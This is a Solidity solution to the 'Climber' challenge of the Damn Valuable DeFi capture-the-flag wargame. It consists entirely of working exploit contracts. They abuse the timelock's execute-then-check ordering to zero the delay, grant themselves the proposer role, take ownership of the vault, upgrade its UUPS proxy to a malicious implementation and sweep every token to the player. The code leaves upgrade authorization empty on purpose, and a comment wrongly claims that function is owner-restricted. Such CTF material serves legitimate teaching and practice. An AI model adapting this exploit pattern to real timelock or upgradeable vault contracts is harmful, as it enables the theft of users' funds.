// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "../DamnValuableToken.sol";

contract MaliciousContractImplementation is UUPSUpgradeable {
    function steal(address _token, address _player) external {
        SafeTransferLib.safeTransfer(
            _token,
            _player,
            IERC20(_token).balanceOf(address(this))
        );
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract MaliciousContractAdmin {
    function scheduleAll(
        ClimberTimelock _timeLock,
        ClimberVault _vault
    ) external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = "0x1";

        bytes memory delayDecrease = abi.encodeCall(_timeLock.updateDelay, (0));
        bytes memory grantProposer = abi.encodeCall(
            _timeLock.grantRole,
            (
                0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1,
                address(this)
            )
        );

        bytes memory schedule = abi.encodeCall(
            this.scheduleAll,
            (_timeLock, _vault)
        );

        bytes memory transferOwnership = abi.encodeCall(
            _vault.transferOwnership,
            (address(this))
        );

        targets[0] = address(_timeLock);
        targets[1] = address(_timeLock);
        targets[2] = address(this);
        targets[3] = address(_vault);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        dataElements[0] = delayDecrease;
        dataElements[1] = grantProposer;
        dataElements[2] = schedule;
        dataElements[3] = transferOwnership;

        _timeLock.schedule(targets, values, dataElements, salt);
    }

    function maliciousUpgradeandSweep(
        MaliciousContractImplementation _maliciousContract,
        address _vaultProxy,
        address _token,
        address _player
    ) external {
        MaliciousContractImplementation(_vaultProxy).upgradeTo(
            address(_maliciousContract)
        );
        MaliciousContractImplementation(_vaultProxy).steal(_token, _player);
    }
}

contract AttackClimber {
    MaliciousContractAdmin malContractAdmin;
    MaliciousContractImplementation malContract;
    ClimberVault vault;
    ClimberTimelock timeLock;
    DamnValuableToken token;
    address player;

    constructor(
        address _player,
        ClimberVault _vault,
        ClimberTimelock _timeLock,
        DamnValuableToken _token
    ) {
        malContractAdmin = new MaliciousContractAdmin();
        malContract = new MaliciousContractImplementation();
        vault = _vault;
        timeLock = _timeLock;
        token = _token;
        player = _player;
    }

    function attack() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = "0x1";

        bytes memory delayDecrease = abi.encodeCall(timeLock.updateDelay, (0));
        bytes memory grantProposer = abi.encodeCall(
            timeLock.grantRole,
            (
                0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1,
                address(malContractAdmin)
            )
        );

        bytes memory schedule = abi.encodeCall(
            malContractAdmin.scheduleAll,
            (timeLock, vault)
        );

        bytes memory transferOwnership = abi.encodeCall(
            vault.transferOwnership,
            (address(malContractAdmin))
        );

        targets[0] = address(timeLock);
        targets[1] = address(timeLock);
        targets[2] = address(malContractAdmin);
        targets[3] = address(vault);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        dataElements[0] = delayDecrease;
        dataElements[1] = grantProposer;
        dataElements[2] = schedule;
        dataElements[3] = transferOwnership;

        timeLock.execute(targets, values, dataElements, salt);

        malContractAdmin.maliciousUpgradeandSweep(
            malContract,
            address(vault),
            address(token),
            player
        );
    }
}
